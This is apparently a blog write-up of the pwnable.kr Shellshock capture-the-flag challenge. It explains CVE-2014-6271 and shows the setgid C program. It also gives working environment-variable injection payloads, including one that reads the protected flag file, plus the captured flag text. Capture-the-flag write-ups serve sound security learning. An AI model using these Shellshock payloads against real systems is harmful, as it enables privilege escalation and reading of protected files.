---
layout: post
title: "pwnable kr SHELLSHOCK"
author: "ron"
tags: ["web"]
---

## Summary
Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :)

`ssh shellshock@pwnable.kr -p2222 (pw:guest)`

{% highlight markdown %}
shellshock@pwnable:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 116 root root             4096 Apr 17 14:10 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c

{% endhighlight %}

**shellshock.c**

{% highlight c %}
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}

{% endhighlight %}

[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), Initial report [CVE-2014–6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271), is a bash vulnerability, where bash incorrectly executes the trailing commands when it imports the function stored into an env variable.

## shellshock example:


`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`


### Solution:

{% highlight markdown %}
shellshock@pwnable:~$ which cat
/bin/cat
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)

{% endhighlight %}

